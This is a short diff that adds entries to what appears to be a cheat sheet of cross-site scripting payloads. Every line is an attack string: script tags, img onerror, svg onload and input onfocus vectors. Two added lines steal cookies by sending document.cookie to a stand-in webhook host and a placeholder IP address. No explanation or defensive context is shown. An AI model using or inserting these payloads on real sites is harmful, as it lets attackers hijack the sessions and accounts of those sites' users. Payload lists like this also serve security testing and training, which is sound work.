@@ -9,7 +9,15 @@
 <script>alert(window.origin)</script>
 <script>alert(document.cookie)</script>
 <img src="" onerror=alert(window.origin)>
+<img src=x onerror=confirm(document.domain)>
+<input autofocus onfocus=confirm(document.domain)>
 <img src="https://x.x.x.x">
+<svg onload=alert(1)></svg>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror="fetch('https://yourwebhook.com?c='+document.cookie)">
+<script>window.open("http://x.x.x.x/log?cookie=" + document.cookie)</script>
+```
+
 ```
 
 ```bash
